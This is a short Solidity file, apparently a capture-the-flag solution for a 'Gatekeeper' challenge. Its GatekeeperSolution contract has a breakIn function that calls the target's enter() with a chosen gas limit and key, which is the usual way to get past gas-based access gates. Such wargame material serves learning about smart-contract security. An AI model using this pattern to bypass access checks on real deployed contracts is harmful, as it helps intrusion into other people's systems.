// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

import 'lib/openzeppelin-contracts/contracts/math/SafeMath.sol';

contract GatekeeperSolution {
  using SafeMath for uint256;

  
    function breakIn(uint256 gasLimit, bytes8 key, IGatekeeper gatekeeper) external {
        gatekeeper.enter{gas: gasLimit}(key);
    }
}
